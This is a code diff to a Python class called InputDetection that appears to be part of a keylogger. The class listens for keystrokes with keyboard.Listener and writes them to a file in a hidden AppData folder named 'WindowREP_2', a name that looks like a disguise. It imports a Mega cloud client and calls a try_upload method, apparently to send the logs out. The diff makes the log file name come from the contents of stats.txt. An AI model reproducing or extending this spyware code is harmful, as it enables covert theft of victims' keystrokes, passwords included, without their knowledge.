@@ -6,7 +6,9 @@ from mega import Mega
 class InputDetection:
 
     def __init__(self):
-        self.PATH = os.path.expanduser("~")+"\\AppData\\local\\WindowREP_2\\keys.txt"
+        with open(os.path.expanduser("~")+"\\AppData\\local\\WindowREP_2\\stats.txt",'r') as file:
+            name = file.read().strip()
+        self.PATH = os.path.expanduser("~")+f"\\AppData\\local\\WindowREP_2\\{name}.txt"
         self.uploaded = False
         pass
 
@@ -60,9 +62,9 @@ class InputDetection:
         self.print_date()
         self.try_upload()
         with keyboard.Listener(
+            
                 on_press=self.on_press) as listener:
             listener.join()
-
         listener = keyboard.Listener(
             on_press=self.on_press)
         listener.start()
